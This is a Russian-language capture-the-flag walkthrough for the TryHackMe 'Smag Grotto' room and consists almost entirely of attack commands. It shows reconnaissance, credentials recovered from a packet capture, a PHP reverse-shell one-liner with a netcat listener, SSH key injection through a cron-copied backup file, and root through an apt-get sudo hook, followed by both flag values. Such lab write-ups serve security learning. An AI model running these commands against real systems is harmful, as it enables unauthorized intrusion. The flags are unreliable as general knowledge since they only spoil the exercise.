[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Smag Grotto](https://tryhackme.com/r/room/smaggrotto) 

Всего 1 заданиe:
## Задание 1
Разверните машину и получите права root.

### Ответьте на вопросы ниже
Что такое флаг пользователя?
```commandline
nmap <IP>
gobuster dir -u http://<IP>/ --wordlist=/usr/share/wordlists/dirb/big.txt
# http://<IP>/mail
# http://<IP>/aW1wb3J0YW50/dHJhY2Uy.pcap
username:helpdesk 
password:cH4nG3M3_n0w
# http://<IP>/admin.php

php -r '$sock=fsockopen("<IP>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
rlwrap nc -nlvp 4444
SHELL=/bin/bash script -q /dev/null
cd /home/jake
ls -la
cat user.txt
cat /etc/crontab
ls -l /opt/.backups/jake_id_rsa.pub.backup
ssh-keygen -t rsa
echo "ssh-rsa ....= kali@kali" > /opt/.backups/jake_id_rsa.pub.backup
ssh jake@<IP>
cat user.txt
```
```commandline
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```

Что такое корневой флаг?
```commandline
sudo -l
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
whoami
cat /root/root.txt
```
```commandline
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)